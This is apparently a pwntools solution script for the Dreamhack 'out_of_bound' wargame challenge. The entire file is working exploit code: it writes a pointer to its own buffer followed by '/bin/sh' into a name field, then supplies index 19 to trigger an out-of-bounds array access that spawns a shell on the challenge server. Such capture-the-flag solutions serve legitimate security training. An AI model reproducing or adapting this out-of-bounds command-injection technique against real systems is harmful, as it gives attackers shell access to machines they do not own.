#!/usr/bin/env python3

from pwn import *

exe = ELF("./out_of_bound", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("host1.dreamhack.games", 9879)

    return p

def main():
    p = conn()

    input()

    p.sendafter(b'name: ', p32(exe.sym['name'] + 4) + b'/bin/sh')
    p.sendlineafter(b'want?: ', b'19')

    p.interactive()

if __name__ == "__main__":
    main()